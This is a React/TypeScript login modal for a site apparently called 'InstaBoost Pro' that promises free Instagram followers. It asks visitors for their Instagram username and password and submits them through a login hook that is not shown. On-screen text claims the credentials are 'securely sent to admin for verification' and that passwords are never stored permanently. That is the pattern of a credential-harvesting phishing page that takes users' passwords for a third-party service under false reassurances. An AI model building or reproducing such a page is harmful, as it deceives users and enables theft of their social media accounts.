import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLogin } from "@/hooks/use-auth";
import { useToast } from "@/hooks/use-toast";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useState } from 'react';

const loginSchema = z.object({
  instagramUsername: z.string().min(1, "Instagram username is required"),
  password: z.string().min(1, "Password is required"),
});

type LoginForm = z.infer<typeof loginSchema>;

interface AuthModalProps {
  isOpen: boolean;
  onClose: () => void;
  isFromBonus?: boolean;
}

export function AuthModal({ isOpen, onClose, isFromBonus = false }: AuthModalProps) {
  const { toast } = useToast();
  const login = useLogin();

  const [formData, setFormData] = useState({
    instagramUsername: "",
    password: "",
    referralCode: sessionStorage.getItem('referralCode') || "",
  });

  const form = useForm<LoginForm>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      instagramUsername: "",
      password: "",
    },
  });

  const onSubmit = async (data: LoginForm) => {
    try {
      await login.mutateAsync(data);
      toast({
        title: "Login Successful!",
        description: "Welcome to InstaBoost Pro!",
      });
      onClose();
      // Force page reload to update authentication state
      window.location.reload();
    } catch (error: any) {
      console.error("Login error:", error);
      toast({
        title: "Login Failed",
        description: error.message || "Unable to connect to server. Please try again.",
        variant: "destructive",
      });
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md" style={{ backgroundColor: 'var(--card-bg)', borderColor: 'var(--gold)' }}>
        <DialogHeader>
          <DialogTitle className="text-center text-2xl font-bold mb-2" style={{ color: 'var(--gold)' }}>
            Login to InstaBoost Pro
          </DialogTitle>
          <DialogDescription className="text-center" style={{ color: 'var(--primary-text)' }}>
            {isFromBonus ? (
              <>
                <span className="block mb-2">Login to claim your bonus</span>
                <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3">
                  <span className="font-semibold text-yellow-400">
                    ⚠️ Important: Login with the same Instagram account where you want to receive free followers!
                  </span>
                </div>
              </>
            ) : (
              "Login with your Instagram account for personalized services"
            )}
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-6">
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <FormField
                control={form.control}
                name="instagramUsername"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="font-medium" style={{ color: 'var(--primary-text)' }}>
                      Instagram Username
                    </FormLabel>
                    <FormControl>
                      <Input
                        {...field}
                        placeholder="your_username"
                        style={{ 
                          backgroundColor: 'var(--main-bg)', 
                          borderColor: 'var(--gold)', 
                          color: 'var(--primary-text)' 
                        }}
                        className="focus:border-2"
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="font-medium" style={{ color: 'var(--primary-text)' }}>
                      Password
                    </FormLabel>
                    <FormControl>
                      <Input
                        {...field}
                        type="password"
                        placeholder="Your password"
                        style={{ 
                          backgroundColor: 'var(--main-bg)', 
                          borderColor: 'var(--gold)', 
                          color: 'var(--primary-text)' 
                        }}
                        className="focus:border-2"
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <div className="rounded-lg p-4" style={{ backgroundColor: 'rgba(214, 173, 96, 0.1)', borderColor: 'var(--gold)' }}>
                <div className="flex items-start space-x-3">
                  <i className="fas fa-shield-alt text-lg mt-1" style={{ color: 'var(--gold)' }}></i>
                  <div className="text-sm" style={{ color: 'var(--muted-text)' }}>
                    <p className="font-semibold mb-2" style={{ color: 'var(--primary-text)' }}>
                      🔒 Don't worry, your details and account are safe in our hands
                    </p>
                    <p>
                      This login is required for blocking scammers and bots. Your credentials are securely sent to admin for verification and fraud prevention only. We never store passwords permanently.
                    </p>
                  </div>
                </div>
              </div>

              <Button
                type="submit"
                disabled={login.isPending}
                className="w-full"
                style={{ 
                  backgroundColor: 'var(--gold)', 
                  color: 'var(--navbar-bg)',
                  borderRadius: '50px',
                  fontWeight: '600',
                  padding: '12px 24px'
                }}
              >
                {login.isPending ? (
                  <i className="fas fa-spinner fa-spin mr-2"></i>
                ) : (
                  <i className="fas fa-sign-in-alt mr-2"></i>
                )}
                Login to Continue
              </Button>
            </form>
          </Form>
        </div>
      </DialogContent>
    </Dialog>
  );
}